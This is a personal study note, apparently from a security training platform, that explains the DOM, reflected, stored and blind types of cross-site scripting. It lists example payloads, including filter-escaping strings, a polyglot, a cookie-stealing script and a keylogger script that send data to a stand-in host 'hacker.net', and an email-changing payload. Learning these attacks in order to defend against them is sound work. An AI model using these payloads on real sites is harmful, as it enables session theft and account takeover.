---
creation date: November 15th 2022
last modified date: November 15th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: [[Injection Attack]] - [[JavaScript]] - [[Websites]] - [[DOM XSS]] - [[Reflected XSS]] - [[Stored XSS]] - [[Blind XSS]]
Search Tag: #📕  

# [[XSS]]  
___

## Description:  
This is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

## Types of XSS
### DOM XSS
Document Object Module(DOM) is a programming interface for HTML XML documents. It represents the page so that programs can change the document structure, style, and content.

This attack works by modifying the JavaScript that a website uses to modify its own pages. If we are able to modify this then when the page is loaded our malicious code will be called into action without needing the user to interact with anything else.

### Reflected XSS
This happens when a user-supplied data in an HTTP request is included in the webpage source without any validation. an example of this could be an error message which is in a query string of a URL that is reflected onto the webpage.
![[Pasted image 20221115155704.png]] 
This error message could be replaced with JavaScript code which gets executed when a user visits the page.

![[Pasted image 20221115160434.png]]
This could be sent to another user and when they open the link it will change their password to `pass123`

### Stored XSS
This XSS payload is stored on the web application (in a database, for example) and then gets run when the other users visit the site or web page. This attack is really damaging because of the amount of users that it can affect.
The attack itself could be done if for example a blog allows users to leave comments and the comment section isn't validated and checked for XSS payloads.
![[Pasted image 20221115160915.png]]
This image shows that we can leave a comment and it doesn't strip away HTML tag.

### Blind XSS
This is similar to Stored XSS in that we are getting our payload to store onto the database but we aren't able to test it for ourselves. This could be because the form we infected can only be checked by say an admin of the site so we only know it worked when an admin opens the form.


## Example Payloads
### Proof of Concept
- Used when we are just trying to demonstrate that we can get XSS on a website.
`<script>alert('XSS');</script>`
#### Escaping
- **Polyglots** What is this you might think. It is an all in one escape for bypassing filters/escaping attributes.
```Java
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
- The following can be when we need to escape the running code in order to get our script to run `">`
`"><script>alert('XSS');</script>`
- If we see the `<textarea>` as shown in image below then we can escape with the following
![[Pasted image 20221229225137.png]]
`</textarea><script>alert('XSS');</script>`
- If our code might be getting reflected directly into JavaScript code then we need to force exit the current code and input our script. The `';` first escapes the code and at the end the `//` will comment out all code after it. In the image **Sam** is our test input into the field.
![[Pasted image 20221229230958.png]]
`';alert('XSS');//`
- If we believe that the site is replacing parts of our script with nothing then we can try to trick it. The following image we tried `<script>alert('THM');</script>` and found its removing the work script.
![[Pasted image 20221229231630.png]]
`<sscriptcript>alert('XSS');</sscriptcript>`

### Session Stealing
- Takes a target's cookies, base64 encodes them to ensure successful transmission and then posts it to a website under the hacker's control.
`<script>fetch('https://hacker.net/steal?cookie=' + btoa(document.cookie));</script>`

### Key logger
- Anything webpage with this running on it will log everything typed on the page and then sent onto the hacker's controlled site for logging.
`<script>document.onkeypress = function(e) { fetch('https://hacker.net/log?key=' + btoa(e.key) );}</script>`

### Business Logic
- More specific in that we are looking for a particular network resource or JavaScript function. We could for example change an email address if we know the function that is used by running the following. In this example we are assuming the JavaScript function is calling `user.changeEmail`
`<script>user.changeEmail('attacker@hacker.thm');</script>`
___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: November 15th 2022 (03:05 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
